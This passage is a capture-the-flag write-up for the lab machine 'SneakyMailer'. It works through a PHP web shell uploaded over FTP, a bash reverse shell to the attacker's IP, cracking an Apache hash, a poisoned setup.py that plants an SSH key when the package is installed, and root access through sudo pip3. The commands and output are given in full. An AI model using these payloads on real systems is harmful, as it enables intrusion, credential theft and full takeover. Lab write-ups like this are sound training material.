drwxr-xr-x   10 0        0            4096 May 26 18:52 fontawesome-free
drwxr-xr-x    2 0        0            4096 May 26 18:52 jquery
drwxr-xr-x    2 0        0            4096 May 26 18:52 jquery-easing
226 Directory send OK.
ftp> cd datatables
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            5799 May 26 18:52 dataTables.bootstrap4.css
-rwxr-xr-x    1 0        0            4693 May 26 18:52 dataTables.bootstrap4.js
-rwxr-xr-x    1 0        0            5222 May 26 18:52 dataTables.bootstrap4.min.css
-rwxr-xr-x    1 0        0            2085 May 26 18:52 dataTables.bootstrap4.min.js
-rwxr-xr-x    1 0        0          448564 May 26 18:52 jquery.dataTables.js
-rwxr-xr-x    1 0        0           82650 May 26 18:52 jquery.dataTables.min.js
226 Directory send OK.
ftp> cd ../
250 Directory successfully changed.
ftp> cd ..
\250 Directory successfully changed.
ftp> get index.php
local: index.php remote: index.php
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for index.php (13742 bytes).
226 Transfer complete.
13742 bytes received in 0.00 secs (21.2061 MB/s)
ftp> cd scss
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0             980 May 26 18:52 _buttons.scss
-rwxr-xr-x    1 0        0             733 May 26 18:52 _cards.scss
-rwxr-xr-x    1 0        0             454 May 26 18:52 _charts.scss
-rwxr-xr-x    1 0        0             356 May 26 18:52 _dropdowns.scss
-rwxr-xr-x    1 0        0            1139 May 26 18:52 _error.scss
-rwxr-xr-x    1 0        0             196 May 26 18:52 _footer.scss
-rwxr-xr-x    1 0        0             886 May 26 18:52 _global.scss
-rwxr-xr-x    1 0        0             893 May 26 18:52 _login.scss
-rwxr-xr-x    1 0        0               1 May 26 18:52 _mixins.scss
-rwxr-xr-x    1 0        0              85 May 26 18:52 _navs.scss
-rwxr-xr-x    1 0        0             239 May 26 18:52 _utilities.scss
-rwxr-xr-x    1 0        0            2477 May 26 18:52 _variables.scss
drwxr-xr-x    2 0        0            4096 May 26 18:52 navs
-rwxr-xr-x    1 0        0             504 May 26 18:52 sb-admin-2.scss
drwxr-xr-x    2 0        0            4096 May 26 18:52 utilities
226 Directory send OK.
ftp> get sb-admin-2.scss
local: sb-admin-2.scss remote: sb-admin-2.scss
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for sb-admin-2.scss (504 bytes).
226 Transfer complete.
504 bytes received in 0.00 secs (3.3379 MB/s)
ftp> cd utilities
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0             596 May 26 18:52 _animation.scss
-rwxr-xr-x    1 0        0             389 May 26 18:52 _background.scss
-rwxr-xr-x    1 0        0             190 May 26 18:52 _border.scss
-rwxr-xr-x    1 0        0              64 May 26 18:52 _display.scss
-rwxr-xr-x    1 0        0              34 May 26 18:52 _progress.scss
-rwxr-xr-x    1 0        0              90 May 26 18:52 _rotate.scss
-rwxr-xr-x    1 0        0             699 May 26 18:52 _text.scss
226 Directory send OK.
```

The login succeeded and I started exploring. The FTP directory and its files looked identical to the live website. I pulled a few files down for closer inspection, but none of them held anything of interest.

```text
ftp> put php-code-exec.php
local: php-code-exec.php remote: php-code-exec.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
33 bytes sent in 0.00 secs (233.5258 kB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 18:52 css
drwxr-xr-x    2 0        0            4096 May 26 18:52 img
-rwxr-xr-x    1 0        0           13742 Jun 23 08:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 18:52 js
--wxrw-rw-    1 1001     1001           33 Nov 11 12:49 php-code-exec.php
drwxr-xr-x    2 0        0            4096 May 26 18:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 18:52 scss
-rwxr-xr-x    1 0        0           26523 May 26 19:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 18:52 vendor
226 Directory send OK.
```

While experimenting on the FTP server I discovered I could use the PUT command. Since this directory appeared to hold the site's code, I uploaded a test file to check whether I could reach it through my browser.

```php
<?php

$var=$_GET['var'];
system($var);

?>
```

## Initial Foothold

![](assets/wu/sneakymailer/img-21.png)

With it I confirmed I was executing as `www-data`.

![](assets/wu/sneakymailer/img-22.png)

, and that three users were able to log into the box: low, developer, and root

![](assets/wu/sneakymailer/img-23.png)

I then attempted to drop my public SSH key into both `low` and `developer` since they had login access, but couldn't get in over SSH because `www-data` lacked write permission to those files.

## Road to User

### Further enumeration

grabbed running processes and etc/passwd, couldn't plant SSH keys, so I moved on to a reverse shell

```text
GET /php-code-exec.php?var=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.174/46445+0>%261' HTTP/1.1

Host: dev.sneakycorp.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
```

fired off my reverse shell and instantly caught a connection on my netcat listener

```text
kac0@kali:~/htb/sneakymailer$ script sneaky-transcript
Script started, output log file is 'sneaky-transcript'.
┌──(kac0㉿kali)-[~/htb/sneakymailer]
└─$ bash                
kac0@kali:~/htb/sneakymailer$ nc -lvnp 46445
listening on [any] 46445 ...
connect to [10.10.14.174] from (UNKNOWN) [<YOUR_IP>] 60704
bash: cannot set terminal process group (725): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ python -c 'import pty;pty.spawn("/bin/bash")'
</dev$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ^Z
[1]+  Stopped                 nc -lvnp 46445
kac0@kali:~/htb/sneakymailer$ stty raw -echo
kac0@kali:~/htb/sneakymailer$ nc -lvnp 46445

www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export TERM=xterm-256color
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ id && hostname
id && hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sneakymailer
```

began enumerating \(this time I remembered to drop into bash, since zsh tends to struggle when upgrading nc shells\)

```text
www-data@sneakymailer:~/sneakycorp.htb$ cd /home
www-data@sneakymailer:/home$ ls
low  vmail
www-data@sneakymailer:/home$ cd vmail
bash: cd: vmail: Permission denied
www-data@sneakymailer:/home$ ls -la
total 16
drwxr-xr-x  4 root  root  4096 May 14 17:10 .
drwxr-xr-x 18 root  root  4096 May 14 05:30 ..
drwxr-xr-x  8 low   low   4096 Jun  8 03:47 low
drwx------  5 vmail vmail 4096 May 19 21:10 vmail
```

`/home` held just two directories, `low` and `vmail`

```text
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ls -la
total 76
drwxrwxr-x 8 root developer  4096 Nov 11 13:23 .
drwxr-xr-x 3 root root       4096 Jun 23 08:15 ..
drwxr-xr-x 2 root root       4096 May 26 19:52 css
drwxr-xr-x 2 root root       4096 May 26 19:52 img
-rwxr-xr-x 1 root root      13742 Jun 23 09:44 index.php
drwxr-xr-x 3 root root       4096 May 26 19:52 js
drwxr-xr-x 2 root root       4096 May 26 19:52 pypi
drwxr-xr-x 4 root root       4096 May 26 19:52 scss
-rwxr-xr-x 1 root root      26523 May 26 20:58 team.php
drwxr-xr-x 8 root root       4096 May 26 19:52 vendor
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ cd ..
www-data@sneakymailer:~/dev.sneakycorp.htb$ ls
dev
www-data@sneakymailer:~/dev.sneakycorp.htb$ cd ..
www-data@sneakymailer:~$ ls
dev.sneakycorp.htb  html  pypi.sneakycorp.htb  sneakycorp.htb
www-data@sneakymailer:~$ cd pypi.sneakycorp.htb/
www-data@sneakymailer:~/pypi.sneakycorp.htb$ ls -la
total 20
drwxr-xr-x 4 root root     4096 May 15 14:29 .
drwxr-xr-x 6 root root     4096 May 14 18:25 ..
-rw-r--r-- 1 root root       43 May 15 14:29 .htpasswd
drwxrwx--- 2 root pypi-pkg 4096 Jun 30 02:24 packages
drwxr-xr-x 6 root pypi     4096 May 14 18:25 venv
www-data@sneakymailer:~/pypi.sneakycorp.htb$ cat .htpasswd 
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```

spotted what appeared to be a hash for a `pypi` user inside the `.htpasswd` file in the `pypi.sneakycorp.htb` folder

```text
┌──(kac0㉿kali)-[~]
└─$ hash-identifier hashes                                                          
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

 Not Found.
--------------------------------------------------
 HASH: $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/

Possible Hashs:
[+] MD5(APR)
--------------------------------------------------
```

the hash was identified as type MD5\(APR\)

```text
┌──(kac0㉿kali)-[~]
└─$ hashcat --help | grep -i APR                                                    
   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | FTP, HTTP, SMTP, LDAP Server
```

hashcat's help output pegged it as an Apache MD5 hash

### Finding user creds

```text
┌──(kac0㉿kali)-[~]
└─$ hashcat -a0 -m1600 --username htb/sneakymailer/hash /usr/share/wordlists/rockyou.txt         
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
Time.Started.....: Wed Nov 11 15:52:56 2020 (2 mins, 18 secs)
Time.Estimated...: Wed Nov 11 15:55:14 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    25994 H/s (9.47ms) @ Accel:64 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3614208/14344385 (25.20%)
Rejected.........: 0/3614208 (0.00%)
Restore.Point....: 3613952/14344385 (25.19%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidates.#1....: souhern4u -> soucia

Started: Wed Nov 11 15:52:45 2020
Stopped: Wed Nov 11 15:55:16 2020
```

That password got me into `http://pypi.sneakycorp.htb:8080/` using the creds `pypi:soufianeelhaoui`

![](assets/wu/sneakymailer/fix-24.png)

![](assets/wu/sneakymailer/fix-25.png)

Neither of the sites linked from this page had anything useful, though. 

```text
www-data@sneakymailer:~/pypkg$ su developer
Password: 
developer@sneakymailer:/dev/shm/pypkg$ id
uid=1001(developer) gid=1001(developer) groups=1001(developer)
```

Back on the box I attempted to `su` over to `developer` using the password from the email, and it worked, landing me a `developer` session. 

```text
developer@sneakymailer:/dev/shm/pypkg$ sudo -l

sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
[sudo] password for developer: 
Sorry, try again.
[sudo] password for developer: 
Sorry, user developer may not run sudo on sneakymailer.
```

A strange network glitch made authentication fail on my first attempt, but once through I learned this user couldn't run anything via `sudo`

[https://pypi.org/project/pypiserver/\#upload-with-setuptools](https://pypi.org/project/pypiserver/#upload-with-setuptools)

> On client-side, edit or create a ~/.pypirc file with a similar content:

```text
    [distutils]
    index-servers =
      pypi
      local

    [pypi]
    username:<your_pypi_username>
    password:<your_pypi_passwd>

    [local]
    repository: http://localhost:8080
    username: <some_username>
    password: <some_passwd>
```

> Then from within the directory of the python-project you wish to upload, issue this command:

```text
    python setup.py sdist upload -r local
```

Next I crafted a setup.py python script following the format at [https://packaging.python.org/tutorials/packaging-projects/\#creating-setup-py](https://packaging.python.org/tutorials/packaging-projects/#creating-setup-py)

```python
import setuptools
import os

if os.getuid() == 1000:
    with open("/home/low/.ssh/authorized_keys", "a") as fh:
        fh.write("\necdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCOQVWrtHkqJofpMNDvUFQlPj7KHcLwMRo5BghGIW8tEAdl2yU0GQ03g2gKnUE9bDGP5NCW6uuEBxSUw73QCYws= kac0@kali")

long_description = "A sneaky pwn package"

setuptools.setup(
    name="sneakymailer-pwn", # Replace with your own username
    version="0.0.1",
    author="kac0",
    author_email="kac0@sneakymailer.htb",
    description="A small pwny package",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)
```

My first attempt wrote my public SSH key to `low`, but the script kept running as `developer` and for some reason wasn't getting installed. So I added a guard to confirm that `low` \(userID 1000\) was the one executing it. Then I followed the instructions to publish the package to pypiserver

```text
[distutils]
index-servers =
  pypi
  local

[pypi]
username:pypi
password:soufianeelhaoui

[sneaky]
repository: http://pypi.sneakycorp.htb:8080
username:pypi
password:soufianeelhaoui
```

I dropped the `.pypirc` file into my distribution's directory, then pointed `developer`'s home there using `export HOME=/dev/shm/pypi`

### User.txt

```text
developer@sneakymailer:~$ python3 setup.py sdist register -r local upload -r local
running sdist
running egg_info
writing sneakymailer_pwn.egg-info/PKG-INFO
writing dependency_links to sneakymailer_pwn.egg-info/dependency_links.txt
writing top-level names to sneakymailer_pwn.egg-info/top_level.txt
reading manifest file 'sneakymailer_pwn.egg-info/SOURCES.txt'
writing manifest file 'sneakymailer_pwn.egg-info/SOURCES.txt'
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

running check
creating sneakymailer-pwn-0.0.1
creating sneakymailer-pwn-0.0.1/sneakymailer_pwn.egg-info
copying files to sneakymailer-pwn-0.0.1...
copying setup.py -> sneakymailer-pwn-0.0.1
copying sneakymailer_pwn.egg-info/PKG-INFO -> sneakymailer-pwn-0.0.1/sneakymailer_pwn.egg-info
copying sneakymailer_pwn.egg-info/SOURCES.txt -> sneakymailer-pwn-0.0.1/sneakymailer_pwn.egg-info
copying sneakymailer_pwn.egg-info/dependency_links.txt -> sneakymailer-pwn-0.0.1/sneakymailer_pwn.egg-info
copying sneakymailer_pwn.egg-info/top_level.txt -> sneakymailer-pwn-0.0.1/sneakymailer_pwn.egg-info
Writing sneakymailer-pwn-0.0.1/setup.cfg
Creating tar archive
removing 'sneakymailer-pwn-0.0.1' (and everything under it)
running register
Registering sneakymailer-pwn to http://pypi.sneakycorp.htb:8080
Server response (200): OK
WARNING: Registering is deprecated, use twine to upload instead (https://pypi.org/p/twine/)
running upload
Submitting dist/sneakymailer-pwn-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080
Server response (200): OK
WARNING: Uploading via this command is deprecated, use twine to upload instead (https://pypi.org/p/twine/)
```

It grumbled about the missing readme, but it still went through

```text
┌──(kac0㉿kali-[~/htb/sneakymailer]
└─$ ssh -i dev low@sneakycorp.htb   
The authenticity of host 'sneakycorp.htb (<YOUR_IP>)' can't be established.
ECDSA key fingerprint is SHA256:I1lCFRteozDGkqC/ZSE2SbHl8ISpJWhfu5nwn6LxbA0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'sneakycorp.htb' (ECDSA) to the list of known hosts.
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Tue Jun  9 03:02:52 2020 from 192.168.56.105
low@sneakymailer:~$ id
uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)
low@sneakymailer:~$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
low@sneakymailer:~$ cat user.txt 
0610************************0a88
```

I then logged in with the SSH key I'd generated and it worked!  Running `sudo -l` threw the same temporary name resolution error and hung for a moment, but this time the output was very interesting!

```text
low@sneakymailer:/dev/shm/fin$ pip3 install setup.py
Looking in indexes: http://pypi.sneakycorp.htb:8080/simple/
Collecting setup.py
  The repository located at pypi.sneakycorp.htb is not a trusted or secure host and is being ignored. If this repository is available via HTTPS we recommend you use HTTPS instead, otherwise you may silence this warning and allow it anyway with '--trusted-host pypi.sneakycorp.htb'.                            
  Could not find a version that satisfies the requirement setup.py (from versions: )
No matching distribution found for setup.py
```

Searching for ways to escalate privileges via sudo and pip3 pointed me to [https://gtfobins.github.io/gtfobins/pip/](https://gtfobins.github.io/gtfobins/pip/)

> File write It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```text
It needs an absolute local file path.
```

```text
    export LFILE=/tmp/file_to_save
    TF=$(mktemp -d)
    echo "open('$LFILE','w+').write('DATA')" > $TF/setup.py
    pip install $TF
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User

### Getting a shell

```text
low@sneakymailer:/dev/shm$ TF=$(mktemp -d)
low@sneakymailer:/dev/shm$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
low@sneakymailer:/dev/shm$ sudo pip3 install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.eLbVbsYr88
# id && hostname
uid=0(root) gid=0(root) groups=0(root)
sneakymailer
# cat root.txt  
cat: root.txt: No such file or directory
# ls -la
total 20
drwx------  3 root root 4096 Nov 11 20:49 .
drwxrwxrwt 16 root root 4096 Nov 11 20:49 ..
-rw-r--r--  1 root root  185 Nov 11 20:49 pip-delete-this-directory.txt
drwxr-xr-x  2 root root 4096 Nov 11 20:49 pip-egg-info
-rw-r--r--  1 root root   86 Nov 11 20:49 setup.py
# pwd
/tmp/pip-req-build-2ueqz020
```

At first I wasn't where I expected to be...the shell had spawned inside the tmp directory where the "module" got installed

### Root.txt

```text
# cd /root
# ls -la
total 44
drwx------  6 root root 4096 Jun 10 04:20 .
drwxr-xr-x 18 root root 4096 May 14 05:30 ..
lrwxrwxrwx  1 root root    9 May 26 22:32 .bash_history -> /dev/null
-rw-r--r--  1 root root  619 May 14 12:57 .bashrc
drwxr-xr-x  3 root root 4096 May 14 15:29 .cache
drwx------  3 root root 4096 Jun 10 04:20 .config
drwx------  3 root root 4096 May 15 13:10 .gnupg
drwxr-xr-x  3 root root 4096 May 14 12:57 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root  977 May 14 13:31 .python_history
-rwx------  1 root root   33 Nov 11 01:09 root.txt
-rw-r--r--  1 root root   66 May 27 13:00 .selected_editor
# cat root.txt
8133************************2998
```
